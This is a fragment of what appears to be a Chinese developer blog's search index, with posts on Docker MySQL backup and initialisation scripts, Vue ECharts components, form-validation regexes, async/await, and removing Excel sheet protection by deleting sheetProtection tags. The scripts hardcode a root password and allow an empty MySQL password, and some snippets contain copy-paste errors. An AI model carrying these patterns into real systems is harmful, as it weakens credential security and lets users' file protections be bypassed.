没有当前备份目录%s,已经自动创建\",DateUtils.getTime())); } try { Runtime.getRuntime().exec(backupSql); } catch (IOException e) { logger.error(StringUtils.format(\"{} 备份脚本执行失败，请检查\",DateUtils.getTime())); throw new RuntimeException(e); } } 但是现在普遍的部署方式为docker部署服务和底层组件，此时如果容器处在同一个网络，网络是通的，但是并不能互相免密登录（因为容器环境的不同，生态并没有完整linux完善），所以就需要一种定时备份数据的程序。 ","date":"2023-05-11","objectID":"/posts/docker%E4%B9%8Bmysql%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD/:0:1","tags":["mysql数据备份"],"title":"Docker之mysql数据备份","uri":"/posts/docker%E4%B9%8Bmysql%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD/"},{"categories":["运维"],"content":"环境简介 主应用程序和MySQL容器部署在不同容器但是属于同一个网络，此时服务器系统没有mysql环境，所以也就没有mysqldump备份命令，此时数据库的备份方案只能在mysql容器上部署。 ","date":"2023-05-11","objectID":"/posts/docker%E4%B9%8Bmysql%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD/:0:2","tags":["mysql数据备份"],"title":"Docker之mysql数据备份","uri":"/posts/docker%E4%B9%8Bmysql%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD/"},{"categories":["运维"],"content":"方案简介 1、MySQL容器挂载出一个目录作为数据备份输出目录，这样服务器系统可以访问； 2、主系统程序部署一个定时任务，通过定时任务把备份数据备份到其他地方（例如通过邮件发送给系统管理员）； 3、主系统程序需要访问到备份数据，那么就需要MySQL容器和主系统程序挂载在主机的同一个目录； ","date":"2023-05-11","objectID":"/posts/docker%E4%B9%8Bmysql%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD/:0:3","tags":["mysql数据备份"],"title":"Docker之mysql数据备份","uri":"/posts/docker%E4%B9%8Bmysql%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD/"},{"categories":["运维"],"content":"技术落地 1、MySQL容器目录挂载 ruoyi-mysql: container_name: ruoyi-mysql image: mysql:5.7 build: context: ./mysql ports: - \"3306:3306\" volumes: - ./mysql/conf:/etc/mysql/conf.d - ./mysql/logs:/logs - ./mysql/data:/var/lib/mysql - ./mysql/backup:/opt/backup command: [ 'mysqld', '--innodb-buffer-pool-size=80M', '--character-set-server=utf8mb4', '--collation-server=utf8mb4_unicode_ci', '--default-time-zone=+8:00', '--lower-case-table-names=1' ] 2、服务器备份脚本 #!/bin/bash # -v ./mysql/backup:/opt/backup # 此文件同放在与backup同级 dockerMysqlName=ruoyi-mysql mysqlUser=root mysqlPassword=password mysqlHost=localhost mysqlPort=3306 dateBackup=$(date +%Y-%m-%d_%H_%M_%S) dir=./backup/${dateBackup} # 宿主机新建目录，通过挂载会自动添加到容器 这里是每次的log文件 if [ ! -d ${dir} ]; then mkdir ${dir} echo \"*****************\u003e 开始备份 ${dateBackup} 数据\u003c*****************\" \u003e\u003e ${dir}/backup.log echo \"创建文件夹 ${dir} 成功\" \u003e\u003e ${dir}/backup.log else echo \"-----------------\u003e 开始备份 ${dateBackup} 数据\u003c-----------------\" \u003e\u003e ${dir}/backup.log echo \"创建文件夹 ${dir} 失败，文件夹已存在\" \u003e\u003e ${dir}/backup.log fi # 需要备份的数据库名 dbNames=(ry-cloud ry-dev ry-config) for dbName in ${dbNames[@]} do echo \"-----------------\u003e 备份 ${dbName} 数据库 start\u003c-----------------\" \u003e\u003e ${dir}/backup.log docker exec -i ${dockerMysqlName} sh -c \"mkdir -p /opt/backup/${dateBackup}/table\" docker exec -i ${dockerMysqlName} sh -c \"mkdir -p /opt/backup/${dateBackup}/data\" echo \" 1、 ---------\u003e 备份 ${dbName} 数据库 表结构 \u003c--------- \" \u003e\u003e ${dir}/backup.log docker exec -i ${dockerMysqlName} sh -c \"mysqldump --opt -u${mysqlUser} -p${mysqlPassword} -h${mysqlHost} -P${mysqlPort} ${dbName} 1\u003e\u003e /opt/backup/${dateBackup}/table/${dbName}-dbschema.sql 2\u003e\u003e /opt/backup/${dateBackup}/table/error.log\" echo \" 2、 ---------\u003e 备份 ${dbName} 数据库 数据 \u003c--------- \" \u003e\u003e ${dir}/backup.log docker exec -i ${dockerMysqlName} sh -c \"mysqldump -t -u${mysqlUser} -p${mysqlPassword} -h${mysqlHost} -P${mysqlPort} ${dbName} 1\u003e\u003e /opt/backup/${dateBackup}/data/${dbName}-dbdata.sql 2\u003e\u003e /opt/backup/${dateBackup}/data/error.log\" echo \"-----------------\u003e 备份 $","date":"2023-05-11","objectID":"/posts/docker%E4%B9%8Bmysql%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD/:0:4","tags":["mysql数据备份"],"title":"Docker之mysql数据备份","uri":"/posts/docker%E4%B9%8Bmysql%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD/"},{"categories":["运维"],"content":"0、网上最常见的**行为 通过Dockerfile中的CMD命令： FROM mysql:5.7 #设置免密登录 ENV MYSQL_ALLOW_EMPTY_PASSWORD yes #将所需文件放到容器中 COPY setup.sh /mysql/setup.sh COPY schema.sql /mysql/schema.sql COPY privileges.sql /mysql/privileges.sql #设置容器启动时执行的命令 CMD [\"sh\", \"/mysql/setup.sh\"] 通过把需要执行的脚本复制到容器镜像中，然后通过CMD命令把脚本执行，从设计角度没问题，但是此时会出现一个问题那就是执行顺序，当前dockerfile文件中的CMD命令会把原来镜像的MySQL启动命令覆盖，所以最后的结果是容器一启动，就执行sh脚本，此时数据库都没有启动，直接报错。 既然如此那就在CMD命令前面加上数据库启动脚本？发现依旧存在其他问题个人可以去尝试一下 ","date":"2023-04-15","objectID":"/posts/docker%E5%90%AF%E5%8A%A8mysql%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B0%E6%8D%AE%E5%BA%93/:0:1","tags":["docker","mysql初始化"],"title":"Docker启动mysql之初始化数据库","uri":"/posts/docker%E5%90%AF%E5%8A%A8mysql%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["运维"],"content":"1、docker-entrypoint-initdb.d 官方是这样介绍的： Initializing a fresh instance When a container is started for the first time, a new database with the specified name will be created and initialized with the provided configuration variables. Furthermore, it will execute files with extensions .sh, .sql and .sql.gz that are found in /docker-entrypoint-initdb.d. Files will be executed in alphabetical order. You can easily populate your mysql services by mounting a SQL dump into that directory and provide custom images with contributed data. SQL files will be imported by default to the database specified by the MYSQL_DATABASE variable. 大致意思： 当容器首次启动时，将创建一个具有指定名称的新数据库，并使用提供的配置变量进行初始化。此外，它将执行扩展名为“.sh”、“.sql”和“.sql.gz”的文件，这些文件位于“/docker entrypoint initdb.d”中。文件将按字母顺序执行。您可以通过[将SQL转储装载到该目录中]来轻松地填充“mysql”服务(https://docs.docker.com/engine/tutorials/dockervolumes/#mount-主机-文件即数据卷）并提供自定义图像有贡献的数据。默认情况下，SQL文件将导入到由“MYSQL_database”变量指定的数据库中。 ","date":"2023-04-15","objectID":"/posts/docker%E5%90%AF%E5%8A%A8mysql%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B0%E6%8D%AE%E5%BA%93/:0:2","tags":["docker","mysql初始化"],"title":"Docker启动mysql之初始化数据库","uri":"/posts/docker%E5%90%AF%E5%8A%A8mysql%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["运维"],"content":"2、开始使用 2.1、dockerfile FROM mysql:5.7 #设置免密登录 ENV MYSQL_ALLOW_EMPTY_PASSWORD yes #将所需文件放到容器中 COPY schema.sql /docker-entrypoint-initdb.d/1schema.sql COPY privileges.sql /docker-entrypoint-initdb.d/2privileges.sql 2.2、数据库初始化文件 -- 创建数据库 create database `nest_cms_api` default character set utf8 collate utf8_general_ci; use nest_cms_api; -- 建表 /* Navicat Premium Data Transfer Source Server : Local-MySQL Source Server Type : MySQL Source Server Version : 80025 Source Host : localhost:3306 Source Schema : nest_cms_api Target Server Type : MySQL Target Server Version : 80025 File Encoding : 65001 Date: 22/10/2021 11:16:32 */ SET NAMES utf8mb4; SET FOREIGN_KEY_CHECKS = 0; -- ---------------------------- -- Table structure for about -- ---------------------------- DROP TABLE IF EXISTS `about`; CREATE TABLE `about` ( `id` char(36) NOT NULL, `name` varchar(255) NOT NULL, `content` mediumtext, `status` tinyint NOT NULL, `createdAt` datetime NOT NULL, `updatedAt` datetime NOT NULL, `banner` varchar(255) NOT NULL, `route` varchar(255) NOT NULL, `description` varchar(255) NOT NULL, `category` varchar(255) NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; -- ---------------------------- -- Records of about -- ---------------------------- BEGIN; INSERT INTO `about` VALUES ('47fd5dd0-d34e-41c5-9375-fbdfc21b405a', '联系我们', '\u003cp\u003e\u0026nbsp;\u003c/p\u003e\u003cfigure class=\\\"image\\\"\u003e\u003cimg src=\\\"http://localhost:3000/uploads/31570b02b5d4cacc55c3c5a07095b1fc1634348290965.jpg\\\"\u003e\u003c/figure\u003e\u003cp\u003eOpera桌面浏览器首创了许多新功能，从而帮助用户提高上网效率，促进创新和网络开发。例如，在Opera浏览器的第一个公开发行版本里，Opera就实现了在一个窗口里同时打开多个文档——这就是普遍流行的“标签式浏览”的前身。又如，2001年Opera首创了“鼠标手势”，极大地改变了许多人网上冲浪的方式。\u003c/p\u003e\u003cp\u003eOpera还有很多创新是围绕着如何帮助用户提高工作效率，如浏览器内置的笔记功能，便于用户快速浏览常用网址的“快速拨号”功能，以及能同步各种浏览信息的OperaLink功能等等。在Opera即将推出的10.0版本中，又加入了可以通过压缩页面为窄带用户带来宽带浏览速度的OperaTurbo加速技术。\u003c/p\u003e\u003cp\u003e\u003cstrong\u003e标签式浏览\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e标签式浏览是现代几乎所有浏览器支持的方式，在打开一个网页时新的网页会在同一个窗口内打开并在靠近窗口顶部的位置出现该网页的选项卡标签，点击这些标签就可以在不同的网页间方便切换，而不必打开一个新的浏览器窗口。\u003c/p\u003e\u003cp\u003e\u003cstrong\u003e快速拨号\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e快速拨号就是可以帮助用户将自己最常访问的多个网站，依次设入“拨号面板”","date":"2023-04-15","objectID":"/posts/docker%E5%90%AF%E5%8A%A8mysql%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B0%E6%8D%AE%E5%BA%93/:0:3","tags":["docker","mysql初始化"],"title":"Docker启动mysql之初始化数据库","uri":"/posts/docker%E5%90%AF%E5%8A%A8mysql%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["前端"],"content":"0、最终实现效果 ","date":"2023-04-07","objectID":"/posts/echarts%E4%B9%8Bliquidfill%E7%90%83%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/:0:1","tags":["Echarts"],"title":"Echarts之liquidFill球状图封装","uri":"/posts/echarts%E4%B9%8Bliquidfill%E7%90%83%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/"},{"categories":["前端"],"content":"1、组件代码 1.1、Vue代码 \u003ctemplate\u003e \u003cdiv class=\"content content-item item\" :style=\"'float: left;background-image: url(' + static_color.bgImage+')'\"\u003e \u003cdiv class=\"statistics-item-1\"\u003e 本月总数 \u003cp\u003e {{ option.num }} \u003cspan\u003e笔\u003c/span\u003e \u003c/p\u003e \u003c/div\u003e \u003cdiv class=\"echarts\" :id=\"option.id\"\u003e\u003c/div\u003e \u003cdiv class=\"statistics-item-2\" :style=\"'color: ' + static_color.color\"\u003e 好评数 \u003cspan :style=\"'color: ' + static_color.color\"\u003e {{ option.total }}笔 \u003c/span\u003e \u003c/div\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript\u003e import * as echarts from 'echarts' import 'echarts-liquidfill' export default { name: 'thematicModelBizMonitor-8-si', props:{ option:{ type: Object }, static_color:{ type: Object } }, mounted() { this.initEcharts() }, methods: { initEcharts() { const echartsDom = document.getElementById(this.option.id) let liquidEchart = echarts.getInstanceByDom(echartsDom) if (liquidEchart == null) { liquidEchart = echarts.init(echartsDom) } liquidEchart.setOption(this.getOption()) }, getOption(){ const data = this.option.num/this.option.total; const option = { // backgroundColor: 'white', series: [ { type: 'liquidFill', radius: '80%', data: [data, data-0.111], backgroundStyle: { color: { type: 'radial', x: 0.5, y: 0.5, r: 0.5, colorStops: this.static_color.background_colorStops, globalCoord: false } }, outline: { borderDistance: 0, itemStyle: { borderWidth: 0, borderColor: { type: 'linear', x: 0, y: 0, x2: 0, y2: 1, colorStops: this.static_color.outline_colorStops, globalCoord: false } } }, // color: ['rgba(37,237,240, 1)', 'rgba(37,200,220, 1)'], color: [ { type: 'linear', x: 0, y: 0, x2: 0, y2: 1, colorStops: this.static_color.line_colorStops, globalCoord: false } ], label: { normal: { formatter: '' } } } ] } return option; } } } \u003c/script\u003e \u003cstyle scoped\u003e .content { width: 100%; height: 350px; box-sizing: content-box; text-align: center; position: relative; display: block; } .content-item { width: 50%; height: 100%; position: relative; } .item{ top: 0; background-position: 50% 150px; background-repeat: no-repeat; background-size: 30","date":"2023-04-07","objectID":"/posts/echarts%E4%B9%8Bliquidfill%E7%90%83%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/:0:2","tags":["Echarts"],"title":"Echarts之liquidFill球状图封装","uri":"/posts/echarts%E4%B9%8Bliquidfill%E7%90%83%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/"},{"categories":["前端"],"content":"2、如何使用 \u003ctemplate\u003e \u003cdiv class=\"grid-content bg-purple\"\u003e \u003cliquidfill-echart :option=\"liquidOption\" :static_color=\"color1\" /\u003e \u003cliquidfill-echart :option=\"liquidOption2\" :static_color=\"color2\" /\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript\u003e import LiquidfillEchart from \"@/components/3DEcharts/liquidfill/liquidfillEchart.vue\"; import { color_blue,color_green } from \"@/components/3DEcharts/liquidfill/liquidConst\" export default { name: 'staticpay', components: { LiquidfillEchart}, data() { return { liquidOption:{ id: \"liquid\", num: 100, total: 200, }, liquidOption2:{ id: \"liquid2\", num: 100, total: 200, }, color1: color_blue, color2: color_green, } }, mounted() { console.log(cubeConst.colors) }, methods: { } } \u003c/script\u003e ","date":"2023-04-07","objectID":"/posts/echarts%E4%B9%8Bliquidfill%E7%90%83%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/:0:3","tags":["Echarts"],"title":"Echarts之liquidFill球状图封装","uri":"/posts/echarts%E4%B9%8Bliquidfill%E7%90%83%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/"},{"categories":["前端"],"content":"0、最终实现效果 ","date":"2023-04-07","objectID":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E4%B9%8B%E5%9C%86%E5%BD%A2%E6%9F%B1%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/:0:1","tags":["Echarts"],"title":"Echarts之3D柱之圆形柱状图封装","uri":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E4%B9%8B%E5%9C%86%E5%BD%A2%E6%9F%B1%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/"},{"categories":["前端"],"content":"1、组件代码 1.1、Vue代码 \u003ctemplate\u003e \u003cdiv :id=\"id\" class=\"cylinder-3d\"\u003e\u003c/div\u003e \u003c/template\u003e \u003cscript\u003e import { get3DOptions } from \"./options.js\"; import * as echarts from 'echarts' export default { name: \"outputMea\", props:{ // id 容器id,可以不传 id: { type: String, default: 'myChart' + Math.ceil(Math.random() * 10) }, // x轴数据 xData: { type: Array, default: () =\u003e { return [] } }, // y轴数据 yData: { type: Array, default: () =\u003e { return [] } }, }, mounted() { this.init(); }, methods:{ init() { let echartsDom = document.getElementById(this.id); //日总产量 let output_3DBarCharts = echarts.init(echartsDom); let option = get3DOptions({xData: this.xData,yData: this.yData}); output_3DBarCharts.setOption(option); this.fetchSize(echartsDom) var that = this window.addEventListener(\"resize\", function () { that.fetchSize(echartsDom) output_3DBarCharts.resize(); },true); }, fetchSize(echartsDom){ let offsetWidth = echartsDom.parentNode.offsetWidth let offsetHeight = echartsDom.parentNode.offsetHeight echartsDom.style.width = offsetWidth+\"px\"; echartsDom.style.height = offsetHeight+\"px\"; debugger } } } \u003c/script\u003e \u003cstyle scoped lang=\"scss\"\u003e .cylinder-3d{ width: 100%; height: 100%; margin: 0 20px; background: no-repeat 46px 93.5%; background-size: calc(100% - 60px) auto; } // #output_3DBarCharts{ // width: calc(100% - 40px); // height: calc(100% - 98px); // margin: 0 20px; // background: url(\"../../assets/bigData/3dBarBg.png\") no-repeat 46px 93.5%; // background-size: calc(100% - 60px) auto; // } \u003c/style\u003e 1.2、js工具类 import * as echarts from 'echarts' /*3D柱形图*/ const get3DOptions = (op = {}) =\u003e { var options = { grid: { left: 60, right: 20, top: 50, bottom: 40 }, legend: { show: true, icon: 'circle', orient: 'horizontal', top: '90.5%', right: 'center', itemWidth: 16.5, itemHeight: 6, textStyle: { color: '#C9C8CD', fontSize: 14 } }, xAxis: [{ data: op.xData || [], axisLabel: { show: true, textStyle: { color: '#aaaaaa', fontSize: 12 }, margin: 30, //刻度标签与轴线之间的距离。 }, axisLine: { show: false //不显示x轴 }, axisTick:","date":"2023-04-07","objectID":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E4%B9%8B%E5%9C%86%E5%BD%A2%E6%9F%B1%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/:0:2","tags":["Echarts"],"title":"Echarts之3D柱之圆形柱状图封装","uri":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E4%B9%8B%E5%9C%86%E5%BD%A2%E6%9F%B1%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/"},{"categories":["前端"],"content":"2、如何使用 \u003ctemplate\u003e \u003cdiv class=\"grid-content bg-purple\"\u003e \u003cecharts-cylinder3d :id=\"'thematicModelBizMonitor13Si'\" :yData=\"yData1\" :xData=\"xData1\" /\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript\u003e import EchartsCylinder3d from '@/components/3DEcharts/cylinder/3D_cylinder.vue' export default { name: 'staticpay', components: { LiquidfillEchart}, data() { return { yData1: [25,36,47,58,34], xData1: [\"测试1\",\"测试2\",\"测试3\",\"测试4\",\"测试5\"], }, mounted() { console.log(cubeConst.colors) }, methods: { } } \u003c/script\u003e ","date":"2023-04-07","objectID":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E4%B9%8B%E5%9C%86%E5%BD%A2%E6%9F%B1%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/:0:3","tags":["Echarts"],"title":"Echarts之3D柱之圆形柱状图封装","uri":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E4%B9%8B%E5%9C%86%E5%BD%A2%E6%9F%B1%E7%8A%B6%E5%9B%BE%E5%B0%81%E8%A3%85/"},{"categories":["前端"],"content":"0、最终实现效果 ","date":"2023-04-07","objectID":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E7%8A%B6%E5%9B%BE%E7%BB%84%E4%BB%B6%E5%B0%81%E8%A3%85/:0:1","tags":["Echarts"],"title":"Echarts之3D柱状图组件封装","uri":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E7%8A%B6%E5%9B%BE%E7%BB%84%E4%BB%B6%E5%B0%81%E8%A3%85/"},{"categories":["前端"],"content":"1、组件代码 1.1、Vue组件代码 \u003ctemplate\u003e \u003cdiv :id=\"id\" style=\"width: 100%;height: 100%;padding: 10px;\"\u003e\u003c/div\u003e \u003c/template\u003e \u003cscript\u003e import * as echarts from 'echarts' import chartUtils from './chartUtils' import cubeConst from './3dcubeConst' export default { name: 'echarts-bar-3d', props: { // id 容器id,可以不传 id: { type: String, default: 'myChart' + Math.ceil(Math.random() * 10) }, // x轴数据 xData: { type: Array, default: () =\u003e { return [] } }, // y轴数据 yData: { type: Array, default: () =\u003e { return [] } }, lineData: { type: Array, default: () =\u003e { return [] } }, // 颜色 colors: { type: Array, default: () =\u003e { return [] } }, // 显示模式 mode: { type: String, // vertical 垂直 // horizontal 水平 default: 'vertical' }, coverYAxis: { type: Object, default: () =\u003e { return {} } }, coverXAxis: { type: Object, default: () =\u003e { return {} } }, coverTooltip: { type: Object, default: () =\u003e { return {} } }, extraSeries: { type: Array, default: () =\u003e { return [] } }, extraYAxis: { type: Array, default: () =\u003e { return [] } }, extraOption: { type: Object, default: () =\u003e { return {} } } }, watch: { yData: function(val) { if ( val \u0026\u0026 val.length \u003e 0 \u0026\u0026 this.xData \u0026\u0026 this.xData.length \u003e 0 \u0026\u0026 this.colors \u0026\u0026 this.colors.length \u003e 0 ) { console.log(\"135\") this.initChart() }else{ console.log(\"125\") } } }, mounted(){ this.initChart(); }, methods: { initChart() { console.log(cubeConst) // 注册自定义3D柱状图 chartUtils.registerShapes() const isVertical = this.mode == 'vertical' // 数据转换 const yData = isVertical ? chartUtils.transferData(this.yData) : this.yData console.log(this.colors) // 根据数据生成series系列 let series = chartUtils.generateSeries(yData, this.colors, this.mode) console.log(series) const option = { animation: false, grid: { show: true, left: 20, right: 40, top: '10%', bottom: '10%', containLabel: true }, tooltip: { show: true, trigger: 'axis', axisPointer: { type: 'shadow' }, textStyle: { color: '#04a19e' }, backgroundColor: 'rgba(0,0,0,0.5)', borderColor: 'rgba(0,0,0,0.3)', formatter: params =\u003e { let result = '\u003cdiv sty","date":"2023-04-07","objectID":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E7%8A%B6%E5%9B%BE%E7%BB%84%E4%BB%B6%E5%B0%81%E8%A3%85/:0:2","tags":["Echarts"],"title":"Echarts之3D柱状图组件封装","uri":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E7%8A%B6%E5%9B%BE%E7%BB%84%E4%BB%B6%E5%B0%81%E8%A3%85/"},{"categories":["前端"],"content":"2、使用 \u003ctemplate\u003e \u003cdiv class=\"grid-content bg-purple\"\u003e \u003cecharts-bar-3d :id=\"'thematicModelBizMonitor11Si'\" :mode=\"'horizontal'\" :yData=\"yData\" :coverYAxis=\"{ name: '/笔', min: 0 }\" :colors=\"colors\" :xData=\"xData\" :coverXAxis=\"coverXAxis\" /\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript\u003e import EchartsBar3d from '@/components/3DEcharts/cdp_cube/3D_cube.vue' import cubeConst from \"@/components/3DEcharts/cdp_cube/3dcubeConst\" export default { name: 'staticpay', components: { EchartsBar3d}, data() { return { // 制图数据 yData: [[\"数据项1\",25,36,47,58,34],[\"数据项2\",15,26,37,48,24]], xData: [\"测试1\",\"测试2\",\"测试3\",\"测试4\",\"测试5\"], colors: cubeConst.colors, coverXAxis: { axisLabel: { formatter: function(value) { if (value) { if (value.trim().length \u003e 5) { let res = '' // 行（不超过5） for (let i = 0; i \u003c 5; i++) { // 每次+5 for (let j = 0; j \u003c value.length; j += 5) { // 还有字的时候取字，没有字的时候补空 if (i + j \u003c value.length) { res += value.charAt(i + j) } else { res += ' ' } } res += '\\n' } return res } return value.split('').join('\\n') } } } } } }, mounted() { console.log(cubeConst.colors) }, methods: { } } \u003c/script\u003e ps:以上组件代码持续优化中，敬请关注 ","date":"2023-04-07","objectID":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E7%8A%B6%E5%9B%BE%E7%BB%84%E4%BB%B6%E5%B0%81%E8%A3%85/:0:3","tags":["Echarts"],"title":"Echarts之3D柱状图组件封装","uri":"/posts/echarts%E4%B9%8B3d%E6%9F%B1%E7%8A%B6%E5%9B%BE%E7%BB%84%E4%BB%B6%E5%B0%81%E8%A3%85/"},{"categories":["前端"],"content":"1、直接在组件中写rules \u003c :rules=’ rules’\u003e 2、在data中写入方法 rules { name: [ { type: 'string', required: true, message: \"名称必填\", trigger: 'blur' }, { max: 30, message: \"名称长度不能超过30位\" }] } 其中name为prop名 type：类型 required：是否必选项（此栏是否为空） message：报错信息 trigger：触发方式 ​ blur ：失去焦点时进行验证 常用：对 input 输入框的验证 ​ change ：当值发生变化时进行验证 常用：下拉框select，日期选择框date-picker，复选框checkbox，单选框radio 3、也可以直接用pattern进行匹配验证: name: [ { pattern: 验证条件, required: true, message: \"提示信息\", trigger: \"blur\" }] rules: { //验证非空和长度 name: [ { required: true, message: \"站点名称不能为空\", trigger: \"blur\" }, { min: 3, max: 5, message: '长度在 3 到 5 个字符', trigger: 'blur' } ], [] } vue常用检验 前端Vue中常用rules校验规则: 1、是否合法IP地址: pattern:/^(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5]).(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5]).(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5]).(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])$/, 2.是否手机号码或者固话 pattern:/^((0\\d{2,3}-\\d{7,8})|(1[34578]\\d{9}))$/, 3.是否身份证号码 pattern:/(^\\d{15}$)|(^\\d{18}$)|(^\\d{17}(\\d|X|x)$)/, 4.是否邮箱 pattern:/^([a-zA-Z0-9]+[-_.]?)+@[a-zA-Z0-9]+.[a-z]+$/, 5.整数填写 pattern:/^-?[1-9]\\d*$/, 6.正整数填写 pattern:/^[1-9]\\d*$/, 7.小写字母 pattern:/^[a-z]+$/, 8.大写字母 pattern:/^[A-Z]+$/, 9.大小写混合 pattern:/^[A-Za-z]+$/, 10.多个8位数字格式(yyyyMMdd)并以逗号隔开 pattern:/^\\d{8}(,\\d{8})*$/, 11.数字加英文，不包含特殊字符 pattern:/^[a-zA-Z0-9]+$/, 12.前两位是数字后一位是英文 pattern:/^\\d{2}[a-zA-Z]+$/, 13.密码校验（6-20位英文字母、数字或者符号（除空格），且字母、数字和标点符号至少包含两种） pattern:/^(?![\\d]+$)(?![a-zA-Z]+$)(?![^\\da-zA-Z]+$)([^\\u4e00-\\u9fa5\\s]){6,20}$/, 14.中文校验 pattern:/^[\\u0391-\\uFFE5A-Za-z]+$/, ","date":"2023-03-20","objectID":"/posts/vue%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%8D%95%E6%A0%A1%E9%AA%8C/:0:0","tags":["vue"],"title":"Vue中的表单校验","uri":"/posts/vue%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%8D%95%E6%A0%A1%E9%AA%8C/"},{"categories":["前端"],"content":"一、什么是promise，及其作用 什么是： Promise是ES6中的一个内置对象，实际是一个构造函数 特点： ①三种状态：pending（进行中）、resolved（已完成）、rejected（已失败）。只有异步操作的结果可以决定当前是哪一种状态，任何其他操作都不能改变这个状态。 ②两种状态的转化：其一，从pending（进行中）到resolved（已完成）。其二，从pending（进行中）到rejected（已失败）。只有这两种形式的转变。 ③Promise构造函数的原型对象上，有then()和catch()等方法，then()第一个参数接收resolved()传来的数据，catch()第一个参数接收rejected()传来的数据 作用： ①通常用来解决异步调用问题 ②解决多层回调嵌套的方案 ③提高代码可读性、更便于维护 二、promise的使用 function getJSON() { return new Promise((resolve, reject) =\u003e { setTimeout(() =\u003e { let json = Math.random() * 2 if (json \u003e 1) { resolve(json) } else { reject(json) } }, 2000) }) } const makeRequest = () =\u003e getJSON() .then(data =\u003e { console.log('data==\u003e', data) return 'done' }) .catch(err =\u003e { console.log('err==\u003e', err) }) makeRequest() 三、什么是Async/Await，及其作用 什么是： ①async/await是ES8新特性 ②async/await是写异步代码的新方式，以前的方法有回调函数和Promise ③async/await是基于Promise实现的，它不能用于普通的回调函数 ④async/await与Promise一样，是非阻塞的 ⑤async/await使得异步代码看起来像同步代码，这正是它的魔力所在 四、Async/Await的使用 function getJSON() { return new Promise((resolve, reject) =\u003e { setTimeout(() =\u003e { let json = Math.random() * 2 if (json \u003e 1) { resolve(json) } else { reject(json) } }, 2000) }) } const makeRequest = async () =\u003e { const value = await getJSON() console.log(value) return value } makeRequest() 五、Async/await 比 Promise 更优越的表现 1、简洁干净：使用 async/await 能省去写多少行代码 2、错误处理：async/wait 能用相同的结构和好用的经典 try/catch 处理同步和异步错误，错误堆栈能指出包含错误的函数。 3、调试：async/await 的一个极大优势是它更容易调试，使用 async/await 则无需过多箭头函数，并且能像正常的同步调用一样直接跨过 await 调用。 六、总结 Async/await进一步优化了Promise.then()的缺点，使代码更简洁，所以在项目中尽量使用Async/await ","date":"2023-03-15","objectID":"/posts/promise%E4%B8%8Easync/await%E7%9A%84%E5%8C%BA%E5%88%AB/:0:0","tags":["Promise"],"title":"Promise与Async/Await的区别","uri":"/posts/promise%E4%B8%8Easync/await%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["Tools"],"content":"Excel撤销单元格保护 单元格保护 1、打开Excel表格，点击上方工具栏的【审阅】，再选择【保护工作表】或者【保护工作簿】 2、出现对话框后，输入想要设定的限制密码即可，也可以根据限制需要在下面勾选相应的选项。 不知道密码 1、改变excel文件后缀名，将xlsx改为zip或者rar，并解压： 2、修改xl/worksheets下的所有xml文件，逐个打开将sheetProtection标签删除 一个sheet.xml文件就代表一个工作空间，一个excel可以包含多个工作空间，所以包含有多个，如果只需要接触特定工作空间的单元格保护，工作空间顺序是和xml文件顺序一致的，可按需修改 3、将去除sheetProtection标签的文件保存，重新压缩为一个压缩文件，修改文件后缀名为xlsx: 工作空间太多？ 面对重复繁杂的程序化工作，我选择编程，面对文件操作我选择python，通过程序化方式将解除单元格保护的步骤写为一个python程序，最后编译为exe文件直接在电脑上运行 仓库地址：removeProtection 程序截图： 